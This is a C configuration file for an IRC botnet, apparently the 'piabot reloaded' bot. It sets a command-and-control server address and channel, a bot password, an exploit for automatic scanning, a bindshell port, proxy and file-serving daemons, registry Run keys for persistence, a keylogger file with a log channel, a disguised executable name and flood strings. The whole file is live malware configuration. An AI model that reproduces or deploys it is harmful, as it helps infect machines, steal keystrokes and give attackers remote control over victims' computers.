// bot configuration (generic) - doesn't need to be encrypted
#define AU_IP "" //  ip for autoscan on startup - blank = local scan
#define AU_EXPLOIT "asn1smb" // exploit for autoscan on startup

int port = 31667;		// server port
int port2 = 6667;		// backup server port
int socks4port = 2020;		// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 69;		// Port # for tftp daemon to run on
int ftpport = brandom(1337,65535); // Port # for ftpd daemon to run on
int httpport = 2001;		// Port # for http daemon to run on
int rloginport = 513;		// Port # for rlogin daemon to run on
unsigned short bindport = 1991;		// Port # for bindshell daemon to run on
BOOL topiccmd = TRUE;		// set to TRUE to enable topic commands
BOOL rndfilename = TRUE;	// use random file name
BOOL AutoStart = TRUE;		// enable autostart registry keys
char prefix = '!';		// command prefix (one character max.)
int maxrand = 5;		// how many random numbers in the nick
int nicktype = COUNTRYNICK;	// nick type (see rndnick.h)
BOOL nickprefix = TRUE;		// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\debug.txt";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

char botid[] = "dang";		// bot id
char version[] = "[\x03\x34\2piabot\2\x03 reloaded 0.6] \2((\2by Bloody\2))\2";		// Bots !version reply
char password[] = "premiumpils";		// bot password
char server[] = "211.174.63.32";	// server
char serverpass[] = "";		// server password
char channel[] = "#adm";		// channel that the bot should join
char chanpass[] = "";	// channel password
char server2[] = "127.0.0.1";	// backup server (optional)
char channel2[] = "#a";		// backup channel (optional)
char chanpass2[] = "b";		// backup channel password (optional)
char filename[] = "wins.exe";	// destination file name
char keylogfile[] = "winabc.sys";		// keylog filename
char valuename[] = "Windows Insecure";	// value name for autostart
char nickconst[] = "eXe|";		// uses rndnick
char szLocalPayloadFile[]="winsys.dat";	// Payload filename
char modeonconn[] = "-x";		// Can be more than one mode and contain both + and -
char exploitchan[] = "#admin";		// Channel where exploit messages get redirected
char keylogchan[] = "#admin";		// Channel where keylog messages get redirected
char psniffchan[] = "#admin";		// Channel where psniff messages get redirected 

char *authost[] = {
	"*@*",
	
};

char *versionlist[] = {
	"mIRC v6.10 Khaled Mardam-Bey",
	"mIRC v6.12 Khaled Mardam-Bey",
	"mIRC v6.14 Khaled Mardam-Bey",
	"mIRC v6.16 Khaled Mardam-Bey"
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "2poiwsfpf3213ew"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif

const char partline[] = "..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a."; //part floodline
const char floodline[] = "..P.a.W.a.a..P.a.W.a.a.P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a..P.a.W.a.a.."; // Flood line
